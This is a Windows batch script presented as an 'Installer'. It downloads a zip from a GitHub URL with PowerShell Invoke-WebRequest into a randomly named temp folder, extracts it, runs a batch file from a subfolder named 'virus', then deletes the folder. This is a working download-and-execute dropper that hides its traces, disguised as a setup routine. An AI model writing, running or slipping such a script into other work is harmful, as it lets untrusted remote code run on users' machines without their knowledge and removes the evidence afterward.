@echo off
setlocal enabledelayedexpansion

goto download


:download
echo Installing setup...
%HOMEDRIVE%
Title Installer
echo Installing...
cd %temp%
set randir=%random%-%random%-%random%-%random%-downloads
md %randir%
echo created Randir downlaod path to %temp%\%randir%
set current_path=%temp%\%randir%
if exist "!current_path!\downloads" (
rd /s /q "!current_path!\downloads"
)
cd "!current_path!"
md downloads
echo starting download
powershell Invoke-WebRequest https://github.com/JoeDeezBalls/special-joeBalls/blob/main/Test.zip?raw=true -O %current_path%\downloads\installer.zip
cd downloads
echo unpacking download
powershell -Command "expand-archive installer.zip -destinationpath %current_path%\downloads" >nul
set install=true
echo starting installer
call %current_path%\downloads\virus\installer.Bat
echo install finished, cleaning up
cd %temp%
rd /s /q %randir%
echo done
timeout 5
exit


